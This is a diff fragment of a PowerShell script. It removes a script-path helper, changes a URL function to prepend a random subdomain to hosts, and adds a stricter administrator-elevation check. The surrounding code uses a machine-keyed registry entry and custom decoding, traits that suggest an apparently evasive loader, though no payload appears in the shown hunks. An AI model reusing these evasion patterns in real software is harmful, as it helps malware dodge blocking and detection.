@@ -49,24 +49,6 @@ $hepaestusReg = "HKCU:\Software\$($(Get-MachineCode))"
 
 $globalDebug = IsDebug;
 
-
-function Get-ScriptPath {
-    $scriptPaths = @(
-        #$MyInvocation.MyCommand.Definition,
-        $PSCommandPath,
-        $MyInvocation.MyCommand.Path
-    )
-    
-    foreach ($path in $scriptPaths) {
-        try {
-            if (Test-Path $path) {
-                return $path
-            }
-        }
-        catch {
-        }
-    }
-}
 function CustomDecode {
     param (
         [string]$inContent,
@@ -131,18 +113,12 @@ function ModifyUrl {
     $uri = [System.Uri]$url
     $domainParts = $uri.Host.Split('.')
     
-    if ($domainParts.Length -eq 1) {
-        $domainParts = @(Get-RandomString) + $domainParts
-    }
-    elseif ($domainParts.Length -eq 2) {
-        $domainParts = @(Get-RandomString) + $domainParts
-    }
-    elseif ($domainParts.Length -eq 3 -and $domainParts[0] -eq "localhost") {
-        $domainParts = @(Get-RandomString) + $domainParts
+
+    if ($domainParts.Length -eq 3 -and $domainParts[0] -eq "localhost") {
     }
     else
     {
-        $domainParts[0] = Get-RandomString
+        $domainParts = @(Get-RandomString) + $domainParts
     }
     $newHost = ($domainParts -join '.')
     
@@ -518,7 +494,7 @@ function RunMe {
 
 }
 
-function IsElevated
+function IsElevatedOld
 {
     if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
     {
@@ -527,6 +503,11 @@ function IsElevated
     return $true
 }
 
+function IsElevated {
+    $winID = [Security.Principal.WindowsIdentity]::GetCurrent()
+    $princ = New-Object Security.Principal.WindowsPrincipal($winID)
+    return $princ.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -and $winID.Owner -ne $winID.User
+}
 
 function Get-EnvPaths {
     $a = Get-LocalAppDataPath
